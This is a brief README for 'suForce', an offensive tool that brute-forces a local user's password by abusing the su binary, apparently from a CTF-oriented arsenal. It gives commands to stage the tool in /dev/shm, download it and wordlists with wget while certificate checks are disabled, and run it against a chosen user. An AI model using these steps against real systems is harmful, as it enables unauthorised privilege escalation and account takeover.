# **suForce**

### Obtains a user's password by abusing the su binary.

![](/suForce/img/screenshot.png)

---

## Download suForce

```sh
cd /dev/shm
wget --no-check-certificate -q "https://raw.githubusercontent.com/VulNyx/Arsenal/refs/heads/main/suForce/suForce"
chmod +x suForce
```

## Download Wordlist (Optional)

```sh
wget --no-check-certificate -q "https://raw.githubusercontent.com/VulNyx/Arsenal/refs/heads/main/suForce/techyou.txt"
wget --no-check-certificate -q "https://raw.githubusercontent.com/VulNyx/Arsenal/refs/heads/main/suForce/top12000.txt"
```

## Usage

```sh
./suForce -u <USER> -w <WORDLIST>
```

---
